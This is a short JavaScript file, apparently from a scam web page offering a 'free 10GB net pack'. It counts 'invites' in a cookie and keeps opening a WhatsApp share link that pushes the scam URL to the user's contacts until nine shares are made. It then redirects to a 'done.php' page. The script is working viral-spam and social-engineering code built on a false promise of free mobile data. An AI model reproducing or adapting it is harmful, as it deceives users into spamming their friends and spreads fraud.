var iOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
var ur="http://free10gb.payuplay.in/done.php";
if(iOS)
{
ur="http://free10gb.payuplay.in/done.php";
}
function setCookie(e,t,n)
{
var i=new Date;
i.setTime(i.getTime()+24*n*60*60*1e3)
;var o="expires="+i.toUTCString();
document.cookie=e+"="+t+"; "+o
}

function getCookie(e)
{for(var t=e+"=",n=document.cookie.split(";"),i=0;i<n.length;i++){for(var o=n[i];" "==o.charAt(0);)o=o.substring(1);if(0==o.indexOf(t))return o.substring(t.length,o.length)}return 0}
function fn1()
{
	var rand=Math.random() * 1000000;
	c=getCookie("invites");
	c++;
	setCookie("invites",c,9);
	if(9>=c)
	{
	window.location.href='whatsapp://send?text=*FREE NET...* FEEE 10GB Net Pack Get Now - http://free10gb.payuplay.in ';
	}
	else 
		window.location.href=ur;
}	
function fn2()
{
	if(c>=9)
	{	
		window.location.href=ur;
	}
	else
		window.alert("Please Invite at least 9 friends or groups to continue. You have invited "+c)
}
var c=getCookie("invites");
if(c>=9)
{
	window.location.href=ur;
}